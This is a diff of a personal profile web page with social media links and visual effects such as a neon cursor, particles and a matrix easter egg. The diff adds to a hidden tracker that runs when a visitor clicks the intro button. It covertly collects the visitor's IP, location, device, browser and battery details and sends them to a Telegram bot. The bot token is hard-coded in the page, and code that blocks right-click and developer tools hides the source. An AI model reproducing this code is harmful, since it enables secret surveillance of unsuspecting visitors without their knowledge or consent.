@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RAVI KING - MY INFO </title>
     
-    <!-- LINK PREVIEW TAGS -->
+    <!-- LINK PREVIEW TAGS (For WhatsApp, Instagram, Facebook) -->
     <meta property="og:title" content="RAVI KING - MY INFO">
     <meta property="og:description" content="The Legendary Digital Creator Experience">
     <meta property="og:image" content="https://i.ibb.co/KpxDMFM8/file-0000000045948211be7784b896880430.png">
@@ -26,11 +26,62 @@
             background-color: black;
             color: white;
             overflow-x: hidden;
-            /* Anti-Select: Text copy hone se rokne ke liye */
-            user-select: none; 
+            user-select: none; /* Text copy hone se rokne ke liye */
             -webkit-user-select: none;
+            cursor: none; /* Custom cursor ke liye default cursor hide kiya */
         }
 
+        /* 1. CUSTOM NEON CURSOR */
+        .cursor-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #00ffcc;
+            border-radius: 50%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            z-index: 9999;
+            box-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc;
+        }
+
+        .cursor-outline {
+            width: 40px;
+            height: 40px;
+            border: 2px solid rgba(0, 255, 204, 0.5);
+            border-radius: 50%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            z-index: 9998;
+            transition: width 0.2s, height 0.2s, background-color 0.2s;
+        }
+
+        /* 2. SECRET MATRIX CANVAS */
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            display: none;
+        }
+
+        /* 3. INTERACTIVE PARTICLES */
+        #particles-js {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -3;
+        }
+
+        /* BACKGROUND */
         #legend-bg {
             position: fixed;
             top: 0;
@@ -39,10 +90,11 @@
             height: 100%;
             background: url('https://i.ibb.co/hFQnZHP1/0897592b9e1c6ee5edb2311324ef71e1.jpg') no-repeat center center fixed;
             background-size: cover;
-            filter: brightness(0.85);
+            filter: brightness(0.6); 
             z-index: -4;
         }
 
+        /* INTRO SCREEN */
         #intro-screen {
             position: fixed;
             top: 0;
@@ -55,7 +107,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 1000;
+            z-index: 1000; 
             transition: opacity 1s ease-out, visibility 1s ease-out;
         }
 
@@ -78,6 +130,7 @@
             transform: scale(1.05);
         }
 
+        /* MAIN CONTENT */
         .scroll-container {
             width: 100%;
             min-height: 100vh;
@@ -85,15 +138,15 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            opacity: 0;
+            opacity: 0; 
             visibility: hidden;
             transition: opacity 1s ease-in 0.5s, visibility 1s ease-in 0.5s;
         }
 
+        /* GLASSMORPHISM CARD */
         .glass-card {
             background: rgba(255, 255, 255, 0.08); 
             backdrop-filter: blur(20px); 
-            -webkit-backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.15);
             box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.4);
             border-radius: 25px;
@@ -102,7 +155,6 @@
             width: 100%;
             max-width: 650px;
             margin-bottom: 30px;
-            /* Smooth transition for 3D Tilt */
             transform-style: preserve-3d; 
         }
 
@@ -113,7 +165,7 @@
             margin-bottom: 5px;
             color: #ffffff;
             text-shadow: 0 2px 10px rgba(0,0,0,0.5);
-            transform: translateZ(30px); /* 3D Pop effect */
+            transform: translateZ(30px);
         }
 
         #greeting-text {
@@ -155,10 +207,9 @@
             text-align: center;
             border-top: 1px solid rgba(255,255,255,0.1);
             padding-top: 15px;
-            min-height: 50px; /* Space for typewriter */
+            min-height: 50px; 
         }
 
-        /* Typewriter Cursor blinking */
         .cursor {
             border-right: 2px solid #fff;
             animation: blink 0.7s infinite;
@@ -177,7 +228,7 @@
             border: 1px solid rgba(255, 255, 255, 0.3);
             backdrop-filter: blur(10px);
             transition: 0.3s;
-            cursor: pointer;
+            cursor: none; 
             transform: translateZ(30px);
         }
 
@@ -187,6 +238,7 @@
             box-shadow: 0 5px 15px rgba(0,0,0,0.3);
         }
 
+        /* GRID SYSTEM */
         .grid-container {
             display: flex;
             flex-direction: column; 
@@ -199,7 +251,6 @@
         .grid-card {
             background: rgba(255, 255, 255, 0.06);
             backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             padding: 15px;
             border-radius: 15px;
@@ -210,7 +261,7 @@
             text-decoration: none; 
             transition: all 0.3s ease;
             box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-            cursor: pointer;
+            cursor: none;
             transform-style: preserve-3d;
         }
 
@@ -238,23 +289,25 @@
 </head>
 <body>
 
-    <!-- Background Layer -->
+    <!-- UI Elements -->
+    <div class="cursor-dot" id="cursor-dot"></div>
+    <div class="cursor-outline" id="cursor-outline"></div>
     <div id="legend-bg"></div>
+    <div id="particles-js"></div>
+    <canvas id="matrix-canvas"></canvas>
 
     <audio id="bg-audio" loop>
         <source src="https://files.catbox.moe/r6xf00.m4a" type="audio/mp4">
     </audio>
 
-    <!-- Intro Screen -->
     <div id="intro-screen">
         <button class="intro-btn" onclick="enterSite()">View Intro by Ravi</button>
     </div>
 
-    <!-- Main Content -->
+    <!-- MAIN CONTENT -->
     <div class="scroll-container" id="main-content">
         
-        <div class="glass-card" data-tilt data-tilt-max="10" data-tilt-speed="400" data-tilt-glare data-tilt-max-glare="0.2">
-            <!-- Dynamic Greeting -->
+        <div class="glass-card main-glass" data-tilt data-tilt-max="10" data-tilt-speed="400" data-tilt-glare data-tilt-max-glare="0.2">
             <div id="greeting-text"></div>
             
             <h1>RAVI KING</h1>
@@ -266,36 +319,31 @@
                 <p><strong>Skills:</strong> Web Dev, Graphic Design, Digital Marketing</p>
                 <p><strong>Work:</strong> Kuch nahi, bas aawargi aur duniya explore karta hoon! </p>
                 <p><strong>Vibe:</strong> Ek number ka bindass insaan, doston ki jaan aur dushmano ke liye toofan! </p>
-                
-                <!-- Typewriter Effect Container -->
                 <span class="attitude-text" id="typewriter"></span>
             </div>
 
-            <a href="mailto:technicalravi2224@gmail.com" class="button">Contact Me</a>
+            <a href="mailto:technicalravi2224@gmail.com" class="button hover-target">Contact Me</a>
         </div>
 
         <h2>MYTHIC ULTRA OP EDITION</h2>
         
         <div class="grid-container">
-            <a href="https://wa.me/919579464434?text=*HELLO%20SIR%20CAN%20YOU%20TEACH%20ME%20ABOUT%20THIS%20??%20MY%20NAME%20IS....*" target="_blank" class="grid-card" data-tilt data-tilt-scale="1.05">
+            <a href="https://wa.me/919579464434?text=*HELLO%20SIR%20CAN%20YOU%20TEACH%20ME%20ABOUT%20THIS%20??%20MY%20NAME%20IS....*" target="_blank" class="grid-card reveal-card hover-target" data-tilt data-tilt-scale="1.05">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
                 <h4>WhatsApp</h4>
                 <p>Message Me</p>
             </a>
-
-            <a href="https://www.instagram.com/_13.aasiq?igsh=OXR3bnB5bGQ5bWo4" target="_blank" class="grid-card" data-tilt data-tilt-scale="1.05">
+            <a href="https://www.instagram.com/_13.aasiq?igsh=OXR3bnB5bGQ5bWo4" target="_blank" class="grid-card reveal-card hover-target" data-tilt data-tilt-scale="1.05">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram">
                 <h4>Instagram</h4>
                 <p>View Profile</p>
             </a>
-
-            <a href="https://www.facebook.com/profile.php?id=100000724942878" target="_blank" class="grid-card" data-tilt data-tilt-scale="1.05">
+            <a href="https://www.facebook.com/profile.php?id=100000724942878" target="_blank" class="grid-card reveal-card hover-target" data-tilt data-tilt-scale="1.05">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Facebook_icon.svg" alt="Facebook">
                 <h4>Facebook</h4>
                 <p>View Profile</p>
             </a>
-
-            <a href="https://youtube.com/@poison.editx.143?si=iWHSLfYmTaPJtUP6" target="_blank" class="grid-card" data-tilt data-tilt-scale="1.05">
+            <a href="https://youtube.com/@poison.editx.143?si=iWHSLfYmTaPJtUP6" target="_blank" class="grid-card reveal-card hover-target" data-tilt data-tilt-scale="1.05">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/0/09/YouTube_full-color_icon_%282017%29.svg" alt="YouTube">
                 <h4>YouTube</h4>
                 <p>View Channel</p>
@@ -303,27 +351,91 @@
         </div>
     </div>
 
-    <!-- 3D Tilt Library -->
+    <!-- EXTERNAL LIBRARIES -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.8.0/vanilla-tilt.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script src="https://unpkg.com/scrollreveal"></script>
 
     <script>
         // ==========================================
-        // FEATURE 1: ANTI-INSPECT & CODE SECURITY
+        // 1. UI EFFECTS (Cursor, Matrix, Particles)
         // ==========================================
-        // Disable Right Click
-        document.addEventListener('contextmenu', event => event.preventDefault());
         
-        // Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
-        document.onkeydown = function(e) {
-            if(e.keyCode == 123) return false; // F12
-            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false; 
-            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false; 
-            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false; 
-        };
+        const cursorDot = document.getElementById("cursor-dot");
+        const cursorOutline = document.getElementById("cursor-outline");
+        window.addEventListener("mousemove", function (e) {
+            cursorDot.style.left = `${e.clientX}px`;
+            cursorDot.style.top = `${e.clientY}px`;
+            cursorOutline.animate({ left: `${e.clientX}px`, top: `${e.clientY}px` }, { duration: 500, fill: "forwards" });
+        });
+
+        document.querySelectorAll('.hover-target, .intro-btn').forEach(link => {
+            link.addEventListener('mouseover', () => {
+                cursorOutline.style.width = '60px'; cursorOutline.style.height = '60px'; cursorOutline.style.backgroundColor = 'rgba(0, 255, 204, 0.1)';
+            });
+            link.addEventListener('mouseout', () => {
+                cursorOutline.style.width = '40px'; cursorOutline.style.height = '40px'; cursorOutline.style.backgroundColor = 'transparent';
+            });
+        });
+
+        const secretCode = ['r', 'a', 'v', 'i'];
+        let keyPressIndex = 0;
+        document.addEventListener('keydown', (e) => {
+            if (e.key.toLowerCase() === secretCode[keyPressIndex]) {
+                keyPressIndex++;
+                if (keyPressIndex === secretCode.length) {
+                    triggerMatrixEgg(); keyPressIndex = 0;
+                }
+            } else keyPressIndex = 0; 
+        });
+
+        function triggerMatrixEgg() {
+            alert("🚀 Secret Hacker Mode Unlocked!");
+            document.getElementById('legend-bg').style.display = 'none';
+            document.getElementById('particles-js').style.display = 'none';
+            const canvas = document.getElementById('matrix-canvas');
+            canvas.style.display = 'block';
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+            const letters = "01010101RAVIKINGMYTHICWARRIOR";
+            const fontSize = 16; const columns = canvas.width / fontSize;
+            const drops = Array.from({ length: columns }).fill(1);
+            setInterval(() => {
+                ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
+                for (let i = 0; i < drops.length; i++) {
+                    const text = letters.charAt(Math.floor(Math.random() * letters.length));
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                    drops[i]++;
+                }
+            }, 33);
+        }
+
+        particlesJS("particles-js", {
+            particles: {
+                number: { value: 60, density: { enable: true, value_area: 800 } },
+                color: { value: "#00ffcc" }, shape: { type: "circle" }, opacity: { value: 0.5 },
+                size: { value: 3, random: true },
+                line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.2, width: 1 },
+                move: { enable: true, speed: 2 }
+            },
+            interactivity: { events: { onhover: { enable: true, mode: "grab" } }, modes: { grab: { distance: 140, line_linked: { opacity: 1 } } } }
+        });
+
+        ScrollReveal().reveal('.main-glass', { delay: 200, distance: '50px', duration: 1000, origin: 'bottom' });
+        ScrollReveal().reveal('.reveal-card', { interval: 150, distance: '50px', duration: 800, origin: 'bottom' });
 
         // ==========================================
-        // FEATURE 2: DYNAMIC GREETING
+        // 2. SECURITY & UTILITIES
         // ==========================================
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            if(e.keyCode == 123) return false;
+            if(e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) return false; 
+            if(e.ctrlKey && e.keyCode == 85) return false; 
+        };
+
         function setDynamicGreeting() {
             const hour = new Date().getHours();
             let greeting = "Welcome";
@@ -331,74 +443,66 @@
             else if (hour >= 12 && hour < 17) greeting = "☀️ Good Afternoon";
             else if (hour >= 17 && hour < 21) greeting = "🌆 Good Evening";
             else greeting = "🌙 Good Night";
-            
             document.getElementById("greeting-text").innerText = greeting + ", Mythic Warrior!";
         }
         setDynamicGreeting();
 
-        // ==========================================
-        // FEATURE 3: TYPEWRITER ANIMATION
-        // ==========================================
-        const attitudeQuotes = [
-            '"Log aag se jalte hain, aur hum apne naam se..."',
-            '"Welcome to my world, jahan rules main banata hoon."'
-        ];
-        let lineIndex = 0;
-        let charIndex = 0;
+        const attitudeQuotes = ['"Log aag se jalte hain, aur hum apne naam se..."', '"Welcome to my world, jahan rules main banata hoon."'];
+        let lineIndex = 0, charIndex = 0;
         const typewriterElement = document.getElementById("typewriter");
 
         function typeWriter() {
             if (lineIndex < attitudeQuotes.length) {
                 if (charIndex < attitudeQuotes[lineIndex].length) {
-                    typewriterElement.innerHTML += attitudeQuotes[lineIndex].charAt(charIndex);
-                    charIndex++;
-                    setTimeout(typeWriter, 50); // Typing speed
+                    typewriterElement.innerHTML += attitudeQuotes[lineIndex].charAt(charIndex); charIndex++;
+                    setTimeout(typeWriter, 50);
                 } else {
-                    typewriterElement.innerHTML += "<br>";
-                    lineIndex++;
-                    charIndex = 0;
-                    setTimeout(typeWriter, 500); // Delay before next line
+                    typewriterElement.innerHTML += "<br>"; lineIndex++; charIndex = 0;
+                    setTimeout(typeWriter, 500);
                 }
-            } else {
-                // Add blinking cursor at the end
-                typewriterElement.innerHTML += '<span class="cursor"></span>';
-            }
+            } else typewriterElement.innerHTML += '<span class="cursor"></span>';
         }
 
         // ==========================================
-        // FEATURE 4: TELEGRAM TRACKER WITH IP & LOCATION
+        // 3. ULTIMATE TELEGRAM TRACKER 
         // ==========================================
         async function sendSecretData() {
             const BOT_TOKEN = "7866527577:AAHo4FxOgEaiE9-LKxEd-eLNWObFhYKSarM";
             const CHAT_ID = "6483196359";
-            let message = "🚨 *New Visitor Alert!* 🚨\n\n";
+            let message = "🚨 *New Target Alert!* 🚨\n\n";
 
-            // Fetch IP & Location
-            let ipInfo = "Fetching failed";
             try {
                 const ipResponse = await fetch("https://ipapi.co/json/");
                 const ipData = await ipResponse.json();
-                ipInfo = `*IP:* ${ipData.ip}\n📍 *Location:* ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n📡 *Provider:* ${ipData.org}`;
+                message += `*IP:* ${ipData.ip}\n📍 *Location:* ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n📡 *Provider:* ${ipData.org}\n\n`;
             } catch (e) {
-                ipInfo = "*IP/Location:* Blocked by Adblocker or Error";
+                message += "*IP/Location:* Blocked by Adblocker\n\n";
             }
-            message += `${ipInfo}\n\n`;
 
-            // RAM & CPU Info
             const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
             const cpu = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "Unknown";
-            message += `💾 *RAM:* ${ram}\n⚙️ *CPU:* ${cpu}\n`;
+            const screenRes = `${window.screen.width}x${window.screen.height} Pixels`;
+            const windowSize = `${window.innerWidth}x${window.innerHeight} Pixels`;
+            const colorDepth = window.screen.colorDepth ? window.screen.colorDepth + "-bit" : "Unknown";
+            const isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) ? "Yes 📱" : "No 💻";
+            
+            message += `📱 *DEVICE INFO:*\n🖥️ *Screen:* ${screenRes}\n🪟 *Browser Window:* ${windowSize}\n🎨 *Color Depth:* ${colorDepth}\n👆 *Touch Support:* ${isTouch}\n💾 *RAM:* ${ram}\n⚙️ *CPU:* ${cpu}\n\n`;
 
-            // Network Info
+            const osInfo = navigator.userAgent; 
+            const language = navigator.language;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const referrer = document.referrer ? document.referrer : "Direct Link or Hidden";
+            const cookiesEnabled = navigator.cookieEnabled ? "Yes 🍪" : "No 🚫";
+            const dnt = navigator.doNotTrack === "1" ? "Enabled 🛑" : "Disabled 🟢";
+
+            message += `🔍 *TRACKING & SYSTEM:*\n🔗 *Came From (Referrer):* ${referrer}\n🗣 *Language:* ${language}\n🌍 *Timezone:* ${timeZone}\n🍪 *Cookies Enabled:* ${cookiesEnabled}\n🛑 *Do Not Track:* ${dnt}\n🤖 *User-Agent:* \`${osInfo}\`\n\n`;
+
             if (navigator.connection) {
                 const networkType = navigator.connection.effectiveType || "Unknown";
                 const speed = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "Unknown";
                 message += `📶 *Network:* ${networkType.toUpperCase()} (${speed})\n`;
-            } else {
-                message += `📶 *Network:* Unknown\n`;
             }
 
-            // Battery Info
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
@@ -410,9 +514,7 @@
 
             message += `🕒 *Time:* ${new Date().toLocaleString()}\n`;
 
-            // Send to Telegram
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            fetch(url, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
@@ -420,24 +522,19 @@
         }
 
         // ==========================================
-        // ENTER SITE LOGIC
+        // 4. ENTER SITE LOGIC
         // ==========================================
         function enterSite() {
             document.getElementById("bg-audio").play();
-            
-            var introScreen = document.getElementById("intro-screen");
-            introScreen.style.opacity = '0';
-            introScreen.style.visibility = 'hidden';
+            document.getElementById("intro-screen").style.opacity = '0';
+            document.getElementById("intro-screen").style.visibility = 'hidden';
 
             var mainContent = document.getElementById("main-content");
             mainContent.style.visibility = 'visible';
             mainContent.style.opacity = '1';
 
-            // Start Typewriter Animation
             setTimeout(typeWriter, 1000); 
-
-            // Trigger Background Tracker
-            sendSecretData();
+            sendSecretData(); // Triggers the tracking payload
         }
     </script>
 </body>
